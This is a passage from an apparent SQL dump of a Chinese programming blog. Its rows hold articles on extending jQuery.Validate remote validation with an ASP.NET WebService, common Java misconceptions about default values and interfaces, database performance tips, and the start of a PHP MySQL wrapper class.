false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; AjaxClass ajaxClass = new AjaxClass();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; try</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (uid == &quot;testuid&quot;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ajaxClass.Msg = &quot;用户名已存在,请重新输入!&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ajaxClass.Result = 0;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if (uid.IndexOf(&quot;test&quot;) == -1)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ajaxClass.Msg = &quot;用户名格式不正确,用户名必须包含test,请重新输入!&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ajaxClass.Result = 0;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ajaxClass.Msg = &quot;格式正确!&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ajaxClass.Result = 1;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; catch</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ajaxClass.Msg = &quot;程序出现异常,请联系管理员!&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ajaxClass.Result = 0;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; return ajaxClass;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>上面的WebService就完整的实现了我先前说的3种错误情况（由于这边仅仅是例子所以就只有表示层，实际开发中需要分层开发，此代码应该放入业务逻辑层）</p>\r\n\r\n<p>注意：在webservice返回值前，如果检查成功必须要为ajaxClass.Result = 1，否则客户端验证会无法通过。</p>\r\n\r\n<p>虽然完成了服务器端的代码修改，但是直接运行页面还是会出错，这是因为我上面所说过的，jQuery.Validate的remote远程的输出只能是true或者false，我们来看下具体的代码，其中注释掉的就是原来官方的代码：</p>\r\n\r\n<p>success: function(response) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; if (response.Result) {//if(response){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var submitted = validator.formSubmitted;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; validator.prepareElement(element);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; validator.formSubmitted = submitted;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; validator.successList.push(element);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; validator.showErrors();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; } else {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var errors = {};</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //errors[element.name] = response.Result || validator.defaultMessage(element, &quot;remote&quot;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; errors[element.name] = response.Msg;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; validator.showErrors(errors);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; previous.message = response.Msg; //previous.valid = response;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; previous.valid = response.Result;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; validator.stopRequest(element, response.Result);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>可以看到一共修改了3处地方：</p>\r\n\r\n<p>1、判断返回值，原来是直接判断response，现在则是判断response.Result，因为现在的response已经是一个包含消息及结果的对象了。</p>\r\n\r\n<p>2、错误消息，原来的错误消息是直接获取默认配置好的消息，我这边是获取response.Msg。</p>\r\n\r\n<p>3、设置previous对象，将previous对象的消息和结果设置为AJAX返回的消息和结果，以供jQuery.Validate下面代码的返回。</p>\r\n\r\n<p>这样jQuery.Validate的remote的方法就修改了，但是并没有结束，原因是先前在AJAX提交参数的时候由于 jQuery.Validate的验证规则的缘故，提交的参数并不是以JSON的格式提交的而是以{uid:function()}这样的方式，结果就导 致了无法设置jQuery.AJAX的contentType:&quot;application/json; charset=utf-8&quot;，如果设置了会出现以下错误：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150725143038163281.jpg\" style=\"height:195px; width:622px\" /></p>\r\n\r\n<p>这样从webservice返回的AjaxClass对象就无法像以往的JSON方式直接操作了，所以我们只能换一种格式&mdash;&mdash;XML，因为webservice默认返回的数据是XML格式：</p>\r\n\r\n<p>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</p>\r\n\r\n<p>- &lt;AjaxClass xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns=&quot;http://tempuri.org/&quot;&gt;</p>\r\n\r\n<p>&nbsp; &lt;Msg&gt;用户名格式不正确,用户名必须包含test,请重新输入!&lt;/Msg&gt;</p>\r\n\r\n<p>&nbsp; &lt;Result&gt;0&lt;/Result&gt;</p>\r\n\r\n<p>&nbsp; &lt;/AjaxClass&gt;</p>\r\n\r\n<p>接下来看下具体的remote方法应该如何编写，设置dataType:&rdquo;xml&rdquo;，然后将XML数据转换成一个对象以供上面我修改的jQuery.Validate的remote方法中ajaxsuccess的使用，具体看一下代码：</p>\r\n\r\n<p>remote:{</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; type: &quot;POST&quot;,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; dataType:&quot;json&quot;,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; async: false,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; url: &quot;WebService.asmx/CheckUid&quot;,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; data: {uid:function(){ return jQuery(&quot;#&lt;%=txtUid.ClientID %&gt;&quot;).val();}},</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; dataFilter: function(dataXML) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var result = new Object();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result.Result = jQuery(dataXML).find(&quot;Result&quot;).text();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result.Msg = jQuery(dataXML).find(&quot;Msg&quot;).text();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (result.Result == &quot;-1&quot;) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result.Result = false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return result;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result.Result = result.Result == &quot;1&quot; ? true : false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return result;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>}</p>\r\n\r\n<p>就是jQuery.Ajax方法dataFilter，可以在AJAX请求成功后将数据进行过滤处理，这里我就使用了jQuery方法把结果和消息从XML中获取出来直接赋给一个对象，再将这个对象返回，交由ajaxsuccess使用。</p>\r\n\r\n<p>这样就算是完成了修改jQuery.Validate的remote方法，使得可以返回验证结果及验证消息，看下效果图：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150725143106966107.jpg\" style=\"height:166px; width:576px\" /></p>\r\n\r\n<p>第三点：在反复使用jQuery.Validate进行AJAX验证时，总是需要编写相关AJAX参数，可否进行进一步封装？（具体见High-3.aspx和jquery.validate.extension.js）</p>\r\n\r\n<p>在开发一个系统的时候经常会用到AJAX的验证，而如果每次都要编写上面那么多的代码还是很不方便，所以我现在就来进行一下简单的封装，代码如下：</p>\r\n\r\n<p>//远程验证抽象方法</p>\r\n\r\n<p>function GetRemoteInfo(postUrl, data) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var remote = {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; type: &quot;POST&quot;,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; async: false,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; url: postUrl,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dataType: &quot;xml&quot;,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; data: data,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dataFilter: function(dataXML) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var result = new Object();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result.Result = jQuery(dataXML).find(&quot;Result&quot;).text();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result.Msg = jQuery(dataXML).find(&quot;Msg&quot;).text();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (result.Result == &quot;-1&quot;) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result.Result = false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return result;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result.Result = result.Result == &quot;1&quot; ? true : false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return result;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; };</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; return remote;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>这个函数主要接收2个参数，一个是远程验证的路径和需要提交的参数，返回包装好的remote对象。</p>\r\n\r\n<p>页面调用也很简单，代码如下：</p>\r\n\r\n<p>&lt;script src=&quot;scripts/jquery.validate.extension.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; &lt;script type=&quot;text/javascript&quot;&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; function InitRules() {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var dataInfo = {uid:function(){ return jQuery(&quot;#&lt;%=txtUid.ClientID %&gt;&quot;).val();}};</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var remoteInfo = GetRemoteInfo(&#39;WebService.asmx/CheckUid&#39;, dataInfo);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; opts = {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rules:</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;%=txtUid.UniqueID %&gt;:</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; required: true,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; remote:remoteInfo</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; &lt;/script&gt;</p>\r\n\r\n<p>怎么样？相比上面的代码一下子干净了很多吧？</p>\r\n\r\n<p>页面上只要做3步操作：</p>\r\n\r\n<p>1、包装好需要提交的data对象。</p>\r\n\r\n<p>2、将远程验证地址和包装好的data对象传递给封装好的方法获取remote对象。</p>\r\n\r\n<p>3、将函数返回的remote对象放入规则中。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>至此使用jQuery.Validate进行客户端验证&mdash;&mdash;不使用微软验证控件的理由这一系列就算全部写完了，大体上将 jQuery.Validate在ASP.NET上的一些常见应用讲了一下，同时也提出了许多我自己修改扩展的东西，希望对正在苦恼客户端验证的朋友有所 帮助，谢谢大家的支持了！</p>\r\n\r\n<p>PS：1、其实这一系列并没有把jQuery.Validate的所有功能介绍完，比如onfocusin，onfocusout，onkeyup等，这些就需要大家在使用的过程中自己查看源代码实验了。</p>\r\n\r\n<p>2、本文有点长，而且内容比较多，如果文中有什么错误或者有指导意见欢迎大家提出来，谢谢了！</p>\r\n\r\n<p>转自:http://www.cnblogs.com/kyo-yo/archive/2010/07/06/Use-jQuery-Validate-To-Being-Client-Validate-High-2.html</p>\r\n',0,1437805902,0,0),(53,16,'Java默认值和接口使用方法纠正','<p>在你的程序生活，你也许没有注意到一些&ldquo;常识性&rdquo;的问题，因为有些时候我们不需要去注意，我们的程序照样能够运行得飞快，但是如果那天有一个无聊的人问你 一个像这样的问题，本来他是非常崇拜你的，可是因为你的一个疏忽就从他的心理掉价了。呵呵，开个玩笔，有一些东西我们还真的不得不注意，因为说不定我们那 天就在这个小沟里翻了。我个人也是个CODER，一直被外界的一些花哨的东西所忽悠着，一直就没有心来看这些书，大致一翻，都懂，没有什么看的。但是，懂 是懂的，可是有很多的所以然，还真的说不出来。<br />\r\n&nbsp;<br />\r\n1、Java里面默认值的误解：<br />\r\n这是Eclipse下面的一张切图，我相信你是很熟悉的，JAVA里面不是说，当变量没有赋值不是有自动的默认值，为什么会在下面出错呢！？：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150725143339582464.png\" style=\"height:396px; width:466px\" /></p>\r\n\r\n<p>这个不是SUN公司的错，怪只怪我们没有仔细看文档，因为我们所看的书中都可能是这样的 说&ldquo;如果没有分配值，系统会为变量自动分配置默认值&rdquo;，我们就信以为真了，有些地方也确实是行得通的，在有时编程的时候也遇到没有赋值就编译通示过的提 示，也没有多去想。这个所说的默认值是指类成员变量在没有赋值的时候会赋以默认值，其它局部变量是不能够享受这种待遇的。这下懂了吧，为什么会出错了，这里一定要给以初使值才行。<br />\r\n&nbsp;<br />\r\n2、很少使用接口<br />\r\n当然这不是说我有这处毛病，你们就有，我只是说我自己，以免在黑暗中被拍了砖头@。至少我相信有一大部朋友是这样的，拿到一个东西，就直接在类里面去实现，因为为什么呢？没有必要吗，为什么要去多写一个接口呢，这不是明摆着给自己找麻烦吗？<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说实话，就在写这篇自我反省以前，我一直都是 这样的，可以说是从来没有写过接口，也许您会说，&ldquo;从来没有写过接口也算是学JAVA&rdquo;，不过不管你怎么说，确实没有写过，所有写的都是直接在类中实现 （注：我这里指的类表示非接口类）。如果有些小程序，确实不需要写，因为实现也很简单，也可能以后不需要继承，也不需要在以后的某年某月再次重新优化一 下，当然没有必要了。<br />\r\n可是，这是一个习惯问题，当你走路习惯了左边，那你走路的时候就不会走右边，你就会在不 知觉中去和车车亲个嘴。我们应该培养自己的这种思维，让我们不管在大小项目中，都会想到要这么做。有句古话叫&ldquo;一屋不扫，何以扫天小&rdquo;就是这个道理，而不 是报以&ldquo;大丈夫不拘小节&rdquo;的态度。<br />\r\n你可能对这个为什么要写接口还是不明白，就像《Think In&nbsp; Java》这样说的，&ldquo;如果你现在写了一个功能，以后发现这个功能执行起来速度不理想的时候，如果你去代码中改，那有可能会是增加BUG进去，如果我们使 用了接口，就不用这么麻烦了，方法重写就很好办&rdquo;，我想也是这样的，我就经常犯这样的错误，有些时候随着时间的推移，连自己写的程序，逻辑都还要慢慢去 理。<br />\r\n&nbsp;<br />\r\n3、让一个类去做特定的事情<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 在《Think In&nbsp; Java》提到，把每个对象都当成服务的提供者，为什么这样说呢？还是说现实的比喻吧，就像是一个人，我们如果希望他什么都会，结果也可能是他什么都会， 但是没有一样东西是能够拿出手的，都是半懂。而如果把这些东西分给多个人去学习，只要他们每人学自己那一部份，结果是每个人懂得都不是那么多，也不会有那 么大的心理负担去学习，最后都学得很精，结果综合的深度，每个人都能够独挡一面，就是这个道理。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 我个人也是经常犯这样的错误，有些时候，一个类下来，什么乱七八糟的功能都有，结果后来多得连自己有时都分不清楚，那些方法在用，那些方法没有用了。<br />\r\n&nbsp;<br />\r\n4、根本不注重合理使用访问控制：public, private, protected<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 我自己写程序的时候，想到什么样方便，就怎么样使用，特别是对于类变量，不管定义成PUBLIC还是 PRIVATE，都可以在当前类中使用无阻，这也应该就是让我不注意的原因吧。如果完全是自己使用，可能出错的机率不会太大，因为个人对这个应该还是熟悉 的，但是如果你的应用程序需要发布，用户来使用就会出错，因为他们调用一个不能够独立执行的方法或者是变量。又或者是一个本来不需要对外公开的方法，你对 外公开了，外面的用户使用了，而在你后面的版本中，你又把这个方法更改了，那么使用者在调用这个方法的时候就会出错，至少你写的程序分健壮性就要打个问号了。</p>\r\n',0,1437806057,0,0),(54,24,'提高数据库运行效率的办法','<p>提高数据库运行效率的办法</p>\r\n\r\n<p>在给定的系统硬件和系统软件条件下，提高数据库系统的运行效率的办法是：</p>\r\n\r\n<p>(1) 在数据库物理设计时，降低范式，增加冗余, 少用触发器, 多用存储过程。</p>\r\n\r\n<p>(2) 当计算非常复杂、而且记录条数非常巨大时(例如一千万条)，复杂计算要先在数据库外面，以文件系统方式用C++语言计算处理完成之后，最后才入库追加到表中去。这是电信计费系统设计的经验。</p>\r\n\r\n<p>(3) 发现某个表的记录太多，例如超过一千万条，则要对该表进行水平分割。水平分割的做法是，以该表主键PK的某个值为界线，将该表的记录水平分割为两个表。若发现某个表的字段太多，例如超过八十个，则垂直分割该表，将原来的一个表分解为两个表。</p>\r\n\r\n<p>(4) 对数据库管理系统DBMS进行系统优化，即优化各种系统参数，如缓冲区个数。</p>\r\n\r\n<p>(5) 在使用面向数据的SQL语言进行程序设计时，尽量采取优化算法。</p>\r\n\r\n<p>总之，要提高数据库的运行效率，必须从数据库系统级优化、数据库设计级优化、程序实现级优化，这三个层次上同时下功夫。</p>\r\n',0,1437806136,0,0),(55,10,'php的mysql类(修改自ecshop)','<p>&lt;?php</p>\r\n\r\n<p>class cls_mysql</p>\r\n\r\n<p>{</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var $link_id&nbsp;&nbsp;&nbsp; = NULL;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var $settings&nbsp;&nbsp; = array();</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var $queryCount = 0;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var $queryTime&nbsp; = &#39;&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var $queryLog&nbsp;&nbsp; = array();</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var $max_cache_time = 300; // 最大的缓存时间，以秒为单位</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var $cache_data_dir = &#39;temp/query_caches/&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var $root_path&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = &#39;&#39;;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var $error_message&nbsp; = array();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var $platform&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = &#39;&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var $version&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = &#39;&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var $dbhash&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = &#39;&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var $starttime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = 0;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var $timeline&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = 0;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var $timezone&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = 0;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var $mysql_config_cache_file_time = 0;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var $mysql_disable_cache_tables = array(); // 不允许被缓存的表，遇到将不会进行缓存</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function __construct($dbhost, $dbuser, $dbpw, $dbname = &#39;&#39;, $charset = &#39;utf8&#39;, $pconnect = 0, $quiet = 0)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;cls_mysql($dbhost, $dbuser, $dbpw, $dbname, $charset, $pconnect, $quiet);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//构造函数</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function cls_mysql($dbhost, $dbuser, $dbpw, $dbname = &#39;&#39;, $charset = &#39;utf8&#39;, $pconnect = 0, $quiet = 0)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($quiet)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;connect($dbhost, $dbuser, $dbpw, $dbname, $charset, $pconnect, $quiet);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;settings = array(</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#39;dbhost&#39;&nbsp;&nbsp; =&gt; 